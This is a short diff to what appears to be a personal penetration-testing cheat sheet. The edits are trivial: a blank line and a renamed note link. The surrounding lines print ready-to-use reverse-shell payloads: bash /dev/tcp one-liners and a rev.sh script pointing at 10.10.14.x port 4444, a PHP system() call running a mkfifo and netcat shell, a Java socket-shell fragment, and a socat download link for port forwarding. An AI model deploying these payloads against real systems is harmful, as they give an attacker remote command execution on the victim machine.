@@ -19,6 +19,7 @@ echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
 echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
 
 ```
+
 ```php
 system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.6+4444+>/tmp/f')
 ```
@@ -76,7 +77,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 ##### Socat port forwarding:
-[[port forwarding]]
+[[Local Ports]]
 [[socat]] #bash #shell
 Download:
 https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
